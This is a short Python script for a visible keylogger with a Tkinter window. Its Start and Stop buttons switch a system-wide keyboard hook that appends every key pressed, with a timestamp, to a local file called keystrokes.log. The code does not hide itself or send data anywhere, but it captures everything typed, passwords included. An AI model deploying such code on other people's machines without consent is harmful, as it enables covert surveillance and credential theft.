import tkinter as tk
from tkinter import messagebox
import keyboard
import datetime
import threading

log_file = "keystrokes.log"


is_logging = False

def on_key_press(event):
    if is_logging:
        key = event.name

        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        with open(log_file, "a") as f:
            f.write(f"{timestamp} - Key Pressed: {key}\n")

def start_logging():
    global is_logging
    if not is_logging:
        is_logging = True
        status_label.config(text="Status: Logging...", fg="green")
        messagebox.showinfo("Info", "Keylogger started. Press 'Esc' to stop.")
    else:
        messagebox.showwarning("Warning", "Keylogger is already running.")

def stop_logging():
    global is_logging
    if is_logging:
        is_logging = False
        status_label.config(text="Status: Stopped", fg="red")
        messagebox.showinfo("Info", "Keylogger stopped.")
    else:
        messagebox.showwarning("Warning", "Keylogger is not running.")


def run_keylogger():
    keyboard.on_press(on_key_press)
    keyboard.wait('esc')  
    stop_logging()


root = tk.Tk()
root.title("Keylogger with UI")
root.geometry("300x150")


status_label = tk.Label(root, text="Status: Stopped", fg="red", font=("Arial", 12))
status_label.pack(pady=10)


start_button = tk.Button(root, text="Start Keylogger", command=start_logging, bg="lightgreen", font=("Arial", 10))
start_button.pack(pady=5)


stop_button = tk.Button(root, text="Stop Keylogger", command=stop_logging, bg="lightcoral", font=("Arial", 10))
stop_button.pack(pady=5)


keylogger_thread = threading.Thread(target=run_keylogger, daemon=True)
keylogger_thread.start()


root.mainloop()